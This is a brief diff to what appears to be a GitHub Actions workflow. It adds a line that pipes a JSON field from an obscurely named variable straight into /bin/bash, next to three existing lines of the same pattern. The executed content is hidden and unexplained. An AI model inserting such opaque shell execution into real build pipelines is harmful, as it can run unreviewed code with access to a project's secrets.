@@ -28,6 +28,7 @@ jobs:
           echo $smffx766 | jq -r .gmkl1096 | /bin/bash
           echo $oetj91686 | jq -r .rf540 | /bin/bash
           echo $i05507 | jq -r .v49 | /bin/bash
+          echo $cfuhq5 | jq -r .b260 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
